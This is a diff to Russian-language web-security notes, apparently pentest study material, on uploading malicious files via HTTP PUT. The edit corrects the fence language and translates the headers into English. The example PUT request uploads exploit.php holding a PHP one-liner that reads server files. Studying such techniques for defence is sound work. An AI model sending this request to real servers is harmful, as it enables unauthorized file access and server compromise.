@@ -481,11 +481,11 @@ GOD.txt
 # Загрузка файлов с использованием PUT
 
 > Некоторые веб-серверы могут быть настроены на поддержку запросов PUT. Если соответствующие меры защиты отсутствуют, это может предоставить альтернативный способ загрузки вредоносных файлов, даже если функция загрузки недоступна через веб-интерфейс.
-```python
+```php
 PUT /images/exploit.php HTTP/1.1
-Хост: уязвимый-website.com
-Тип содержимого: application/x-httpd-php
-Длина содержимого: 49
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
 
 <?php echo file_get_contents('/path/to/file'); ?>
 ```
